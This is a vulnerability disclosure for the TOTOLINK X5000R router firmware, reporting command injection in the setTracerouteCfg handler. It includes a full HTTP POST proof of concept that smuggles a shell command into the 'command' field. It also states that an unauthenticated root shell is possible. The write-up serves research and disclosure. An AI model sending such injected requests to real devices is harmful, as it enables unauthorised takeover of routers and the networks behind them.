# Firmware Has an command injection vulnerability

## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html
- Version ：TOTOLINK X5000R V9.1.0u.6118_B20201102、TOTOLINK X5000R V9.1.0u.6369_B20230113

## Product Information

![](./img/1.png)

## Analyse

TOTOLINK X5000R (V9.1.0u.6369_B20230113)was found to contain a command insertion vulnerability in setting/setTracerouteCfg.This vulnerability allows an attacker to execute arbitrary commands through the "command" parameter.

![image.png](./img/2.png)

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 82
Origin: http://192.168.3.2
Connection: close
Referer: http://192.168.3.2/advance/traceroute.html?time=1679125513355
Cookie: SESSION_ID=2:1679122532:2

{"command":"127.0.0.1; pwd > /tmp/1.txt;","num":"4","topicurl":"setTracerouteCfg"}
```

![image.png](./img/3.png)

Finally, you can write exp to get a stable root shell without authorization.









